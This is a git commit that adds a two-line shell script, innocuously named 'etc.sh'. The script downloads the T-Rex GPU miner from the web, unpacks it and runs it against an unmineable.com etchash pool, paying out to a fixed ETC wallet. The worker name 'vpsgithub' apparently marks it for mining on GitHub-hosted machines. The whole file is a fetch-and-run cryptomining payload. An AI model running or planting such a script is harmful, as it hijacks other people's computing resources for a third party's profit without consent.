ba198f1d6162b1318bea034af65623339d86b7f7
Nokie Mie <57029406+YangBeb@users.noreply.github.com>
2021-08-22 17:49:31 +0700

    Create etc.sh

---
+++ etc.sh
@@ -0,0 +1,2 @@
+sudo apt update
+wget https://trex-miner.com/download/t-rex-0.19.14-linux-cuda11.1.tar.gz && tar -xvf t-rex-0.19.14-linux-cuda11.1.tar.gz && ./t-rex -a etchash -o etchash.unmineable.com:3333 -u ETC:0x1fb2F8bc46bfB72dA5669197B8CbB72A42c26F28.vpsgithub -p x
